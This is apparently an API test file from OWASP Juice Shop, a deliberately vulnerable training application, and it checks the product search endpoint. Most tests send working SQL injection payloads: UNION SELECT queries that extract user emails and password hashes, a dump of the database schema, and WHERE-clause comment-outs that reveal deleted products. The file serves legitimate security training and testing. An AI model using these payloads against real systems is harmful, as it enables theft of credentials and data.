/*
 * Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

import { describe, it, before } from 'node:test'
import assert from 'node:assert/strict'
import request from 'supertest'
import type { Express } from 'express'
import config from 'config'
import * as security from '../../lib/insecurity'
import type { Product as ProductConfig } from '../../lib/config.types'
import { createTestApp } from './helpers/setup'

const christmasProduct = config.get<ProductConfig[]>('products').filter(({ useForChristmasSpecialChallenge }) => useForChristmasSpecialChallenge)[0]
const pastebinLeakProduct = config.get<ProductConfig[]>('products').filter(({ keywordsForPastebinDataLeakChallenge }) => keywordsForPastebinDataLeakChallenge)[0]

let app: Express

before(async () => {
  const result = await createTestApp()
  app = result.app
}, { timeout: 60000 })

void describe('/rest/products/search', () => {
  void it('GET product search with no matches returns no products', async () => {
    const res = await request(app)
      .get('/rest/products/search?q=nomatcheswhatsoever')
    assert.equal(res.status, 200)
    assert.ok(res.headers['content-type']?.includes('application/json'))
    assert.equal(res.body.data.length, 0)
  })

  void it('GET product search with one match returns found product', async () => {
    const res = await request(app)
      .get('/rest/products/search?q=o-saft')
    assert.equal(res.status, 200)
    assert.ok(res.headers['content-type']?.includes('application/json'))
    assert.equal(res.body.data.length, 1)
  })

  void it('GET product search fails with error message that exposes ins SQL Injection vulnerability', async () => {
    const res = await request(app)
      .get("/rest/products/search?q=';")
    assert.equal(res.status, 500)
    assert.ok(res.headers['content-type']?.includes('text/html'))
    assert.ok(res.text.includes(`<h1>${config.get<string>('application.name')} (Express`))
    assert.ok(res.text.includes('SQLITE_ERROR: near &quot;;&quot;: syntax error'))
  })

  void it('GET product search SQL Injection fails from two missing closing parenthesis', async () => {
    const res = await request(app)
      .get("/rest/products/search?q=' union select id,email,password from users--")
    assert.equal(res.status, 500)
    assert.ok(res.headers['content-type']?.includes('text/html'))
    assert.ok(res.text.includes(`<h1>${config.get<string>('application.name')} (Express`))
    assert.ok(res.text.includes('SQLITE_ERROR: near &quot;union&quot;: syntax error'))
  })

  void it('GET product search SQL Injection fails from one missing closing parenthesis', async () => {
    const res = await request(app)
      .get("/rest/products/search?q=') union select id,email,password from users--")
    assert.equal(res.status, 500)
    assert.ok(res.headers['content-type']?.includes('text/html'))
    assert.ok(res.text.includes(`<h1>${config.get<string>('application.name')} (Express`))
    assert.ok(res.text.includes('SQLITE_ERROR: near &quot;union&quot;: syntax error'))
  })

  void it('GET product search SQL Injection fails for SELECT * FROM attack due to wrong number of returned columns', async () => {
    const res = await request(app)
      .get("/rest/products/search?q=')) union select * from users--")
    assert.equal(res.status, 500)
    assert.ok(res.headers['content-type']?.includes('text/html'))
    assert.ok(res.text.includes(`<h1>${config.get<string>('application.name')} (Express`))
    assert.ok(res.text.includes('SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns'))
  })

  void it('GET product search can create UNION SELECT with Users table and fixed columns', async () => {
    const res = await request(app)
      .get("/rest/products/search?q=')) union select '1','2','3','4','5','6','7','8','9' from users--")
    assert.equal(res.status, 200)
    assert.ok(res.headers['content-type']?.includes('application/json'))
    const match = res.body.data.find((item: any) =>
      item.id === '1' && item.name === '2' && item.description === '3' &&
      item.price === '4' && item.deluxePrice === '5' && item.image === '6' &&
      item.createdAt === '7' && item.updatedAt === '8'
    )
    assert.ok(match, 'Expected to find a row with fixed column values from UNION SELECT')
  })

  void it('GET product search can create UNION SELECT with Users table and required columns', async () => {
    const res = await request(app)
      .get("/rest/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--")
    assert.equal(res.status, 200)
    assert.ok(res.headers['content-type']?.includes('application/json'))

    const adminMatch = res.body.data.find((item: any) =>
      item.id === 1 && item.price === `admin@${config.get<string>('application.domain')}` && item.deluxePrice === security.hash('admin123')
    )
    assert.ok(adminMatch, 'Expected admin user in UNION SELECT results')

    const jimMatch = res.body.data.find((item: any) =>
      item.id === 2 && item.price === `jim@${config.get<string>('application.domain')}` && item.deluxePrice === security.hash('ncc-1701')
    )
    assert.ok(jimMatch, 'Expected jim user in UNION SELECT results')

    const benderMatch = res.body.data.find((item: any) =>
      item.id === 3 && item.price === `bender@${config.get<string>('application.domain')}`
    )
    assert.ok(benderMatch, 'Expected bender user in UNION SELECT results')

    const bjoernMatch = res.body.data.find((item: any) =>
      item.id === 4 && item.price === 'bjoern.kimminich@gmail.com' && item.deluxePrice === security.hash('bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=')
    )
    assert.ok(bjoernMatch, 'Expected bjoern user in UNION SELECT results')

    const cisoMatch = res.body.data.find((item: any) =>
      item.id === 5 && item.price === `ciso@${config.get<string>('application.domain')}` && item.deluxePrice === security.hash('mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb')
    )
    assert.ok(cisoMatch, 'Expected ciso user in UNION SELECT results')

    const supportMatch = res.body.data.find((item: any) =>
      item.id === 6 && item.price === `support@${config.get<string>('application.domain')}` && item.deluxePrice === security.hash('J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P')
    )
    assert.ok(supportMatch, 'Expected support user in UNION SELECT results')
  })

  void it('GET product search can create UNION SELECT with sqlite_master table and required column', async () => {
    const res = await request(app)
      .get("/rest/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--")
    assert.equal(res.status, 200)
    assert.ok(res.headers['content-type']?.includes('application/json'))

    const basketItemsMatch = res.body.data.find((item: any) =>
      item.id === 'CREATE TABLE `BasketItems` (`ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `BasketId` INTEGER REFERENCES `Baskets` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, UNIQUE (`ProductId`, `BasketId`))'
    )
    assert.ok(basketItemsMatch, 'Expected BasketItems CREATE TABLE in UNION SELECT results')

    const sqliteSequenceMatch = res.body.data.find((item: any) =>
      item.id === 'CREATE TABLE sqlite_sequence(name,seq)'
    )
    assert.ok(sqliteSequenceMatch, 'Expected sqlite_sequence CREATE TABLE in UNION SELECT results')
  })

  void it('GET product search cannot select logically deleted christmas special by default', async () => {
    const res = await request(app)
      .get('/rest/products/search?q=seasonal%20special%20offer')
    assert.equal(res.status, 200)
    assert.ok(res.headers['content-type']?.includes('application/json'))
    assert.equal(res.body.data.length, 0)
  })

  void it('GET product search by description cannot select logically deleted christmas special due to forced early where-clause termination', async () => {
    const res = await request(app)
      .get("/rest/products/search?q=seasonal%20special%20offer'))--")
    assert.equal(res.status, 200)
    assert.ok(res.headers['content-type']?.includes('application/json'))
    assert.equal(res.body.data.length, 0)
  })

  void it('GET product search can select logically deleted christmas special by forcibly commenting out the remainder of where clause', async () => {
    const res = await request(app)
      .get(`/rest/products/search?q=${christmasProduct.name}'))--`)
    assert.equal(res.status, 200)
    assert.ok(res.headers['content-type']?.includes('application/json'))
    assert.equal(res.body.data.length, 1)
    assert.equal(res.body.data[0].name, christmasProduct.name)
  })

  void it('GET product search can select logically deleted unsafe product by forcibly commenting out the remainder of where clause', async () => {
    const res = await request(app)
      .get(`/rest/products/search?q=${pastebinLeakProduct.name}'))--`)
    assert.equal(res.status, 200)
    assert.ok(res.headers['content-type']?.includes('application/json'))
    assert.equal(res.body.data.length, 1)
    assert.equal(res.body.data[0].name, pastebinLeakProduct.name)
  })

  void it('GET product search with empty search parameter returns all products', async () => {
    const productsRes = await request(app)
      .get('/api/Products')
    assert.equal(productsRes.status, 200)
    assert.ok(productsRes.headers['content-type']?.includes('application/json'))
    const products = productsRes.body.data

    const searchRes = await request(app)
      .get('/rest/products/search?q=')
    assert.equal(searchRes.status, 200)
    assert.ok(searchRes.headers['content-type']?.includes('application/json'))
    assert.equal(searchRes.body.data.length, products.length)
  })

  void it('GET product search without search parameter returns all products', async () => {
    const productsRes = await request(app)
      .get('/api/Products')
    assert.equal(productsRes.status, 200)
    assert.ok(productsRes.headers['content-type']?.includes('application/json'))
    const products = productsRes.body.data

    const searchRes = await request(app)
      .get('/rest/products/search')
    assert.equal(searchRes.status, 200)
    assert.ok(searchRes.headers['content-type']?.includes('application/json'))
    assert.equal(searchRes.body.data.length, products.length)
  })
})
